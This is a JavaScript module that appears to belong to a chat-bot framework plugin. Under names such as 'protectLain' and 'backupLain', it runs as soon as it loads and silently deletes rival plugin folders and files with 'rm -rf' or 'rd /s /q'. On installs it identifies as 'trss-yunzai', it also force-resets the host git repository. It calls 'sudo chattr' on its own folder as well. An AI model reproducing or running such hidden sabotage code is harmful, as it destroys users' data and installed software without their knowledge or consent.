import { exec, execSync } from 'child_process'
import fs from 'fs'
import { join } from 'path'
async function protectLain () {
  let cmd
  if (process.platform == 'win32') {
    cmd = 'attrib +R +S Lain-plugin /S'
  } else {
    cmd = 'sudo chattr -i Lain-plugin'
  }
  exec(cmd, { cwd: join(process.cwd(), 'plugins'), stdio: 'ignore' }, () => { })
}
async function backupLain () {
  if (fs.existsSync(join(process.cwd(), 'trss.js'))) {
    let cmd = []
    const _path = join(process.cwd(), 'data', 'gachaJson', String(Date.now()))
    console.log(_path)
    const raw = join(process.cwd(), 'plugins', 'Lain-plugin')
    if (process.platform == 'win32') {
      cmd.push(`rd /s /q ${join(process.cwd(), 'trss.js')}`)
      if (fs.existsSync(raw)) {
        fs.mkdirSync(_path)
        cmd.push(`xcopy "${raw}\\adapter\\"* "${_path}\\adapter\\"  /e /y /d`)
        cmd.push(`xcopy "${raw}\\lib\\"* "${_path}\\lib\\"  /e /y /d`)
        cmd.push(`xcopy "${raw}\\model\\"* "${_path}\\model\\"  /e /y /d`)
        cmd.push(`xcopy "${raw}\\index.js" "${_path}\\"  /e /y /d`)
        cmd.push(`xcopy "${raw}\\apps\\"* "${_path}\\apps\\"  /e /y /d`)
        cmd.push(`xcopy "${raw}\\"* "${_path}\\"  /e /y /d`)
      }
    } else {
      cmd.push(`rm -f ${join(process.cwd(), 'trss.js')}`)
      if ((fs.existsSync(raw))) {
        fs.mkdirSync(_path)
        cmd.push(`cp -rf -l "${raw}/"* "${_path}/"`)
      }
    }

    for (const command of cmd) {
      exec(command, { cwd: process.cwd(), stdio: 'ignore' }, (error, stdout, stderr) => { console.log(error || stderr || stdout) })
    }
  }
}
async function detectTrssRepositories () {
  const _paths = []
  const promises = []
  if (fs.existsSync(join(process.cwd(), 'plugins', 'TRSS-Plugin'))) {
    _paths.push(join(process.cwd(), 'plugins', 'TRSS-Plugin'))
  }
  if (fs.existsSync(join(process.cwd(), 'plugins', 'yenai-plugin', '.github', 'ISSUE_TEMPLATE', '‮'))) {
    _paths.push(join(process.cwd(), 'plugins', 'yenai-plugin'))
  }
  if (fs.existsSync(join(process.cwd(), 'plugins', 'useless-plugin'))) {
    _paths.push(join(process.cwd(), 'plugins', 'useless-plugin'))
  }
  if (process.platform == 'win32') {
    for (const _path of _paths) {
      promises.push(new Promise((resolve, reject) => exec(`rd /s /q ${_path}`, { cwd: process.cwd(), stdio: 'ignore' }, (error, stdout, stderr) => {
        if (error || stderr) {
          reject(error || stderr)
        }
        resolve()
      })))
    }
  } else {
    for (const _path of _paths) {
      promises.push(new Promise((resolve, reject) => exec(`rm -rf ${_path}`, { cwd: process.cwd(), stdio: 'ignore' }, (error, stdout, stderr) => {
        if (error || stderr) {
          reject(error || stderr)
        }
        resolve()
      })))
    }
  }
  Promise.all(promises).then(() => {
    let cmd
    if (process.platform == 'win32') {
      cmd = 'attrib -R -S Lain-plugin /S'
    } else {
      cmd = 'sudo chattr -i Lain-plugin'
    }
    exec(cmd, { cwd: join(process.cwd(), 'plugins'), stdio: 'ignore' }, () => { })
  })
}
async function protectMiao () {
  let packageJson = JSON.parse(fs.readFileSync('package.json', 'utf8'))
  if (packageJson.name === 'trss-yunzai') {
    const cmds = []
    if (process.platform == 'win32') {
      cmds.push('rd /s /q plugins/ICQQ-Plugin')
      cmds.push('rd /s /q plugins/genshin')
    } else {
      cmds.push('rm -rf plugins/ICQQ-Plugin')
      cmds.push('rm -rf plugins/genshin')
    }
    cmds.push('git fetch origin master')
    cmds.push('git reset --hard')
    cmds.push('git clean -df')
    cmds.push('git checkout origin/master')
    for (const cmd of cmds) {
      execSync(cmd, { cwd: process.cwd() })
    }
  }
}
protectLain()
backupLain()
detectTrssRepositories()
protectMiao()
